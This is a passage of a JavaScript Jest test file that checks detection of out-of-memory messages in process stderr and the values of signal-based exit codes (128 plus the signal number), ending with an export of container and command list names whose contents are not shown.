    test('detects "oom-kill" message', () => {
      expect(detectOOMFromStderr('oom-kill: process 1234')).toBe(true);
      expect(detectOOMFromStderr('OOM kill triggered')).toBe(true);
    });

    test('detects "cannot allocate memory" message', () => {
      expect(detectOOMFromStderr('cannot allocate memory')).toBe(true);
    });

    test('detects "memory cgroup out of memory" message', () => {
      expect(detectOOMFromStderr('memory cgroup out of memory')).toBe(true);
    });

    test('returns false for non-OOM stderr', () => {
      expect(detectOOMFromStderr('Normal error message')).toBe(false);
      expect(detectOOMFromStderr('Command not found')).toBe(false);
      expect(detectOOMFromStderr('')).toBe(false);
    });

    test('returns false for null/undefined stderr', () => {
      expect(detectOOMFromStderr(null)).toBe(false);
      expect(detectOOMFromStderr(undefined)).toBe(false);
    });
  });

  describe('EXIT_CODES constants', () => {
    test('EXIT_CODES has expected values', () => {
      expect(EXIT_CODES.SIGKILL).toBe(137);
      expect(EXIT_CODES.SIGTERM).toBe(143);
      expect(EXIT_CODES.SIGXCPU).toBe(152);
      expect(EXIT_CODES.SIGXFSZ).toBe(153);
      expect(EXIT_CODES.SIGSYS).toBe(159);
    });

    test('exit codes are calculated correctly (128 + signal)', () => {
      expect(EXIT_CODES.SIGKILL).toBe(128 + 9);   // SIGKILL = 9
      expect(EXIT_CODES.SIGTERM).toBe(128 + 15);  // SIGTERM = 15
      expect(EXIT_CODES.SIGXCPU).toBe(128 + 24);  // SIGXCPU = 24
      expect(EXIT_CODES.SIGXFSZ).toBe(128 + 25);  // SIGXFSZ = 25
      expect(EXIT_CODES.SIGSYS).toBe(128 + 31);   // SIGSYS = 31
    });
  });
});

// Export for Jest
module.exports = {
  ALLOWED_CONTAINERS,
  BLOCKED_COMMANDS,
};
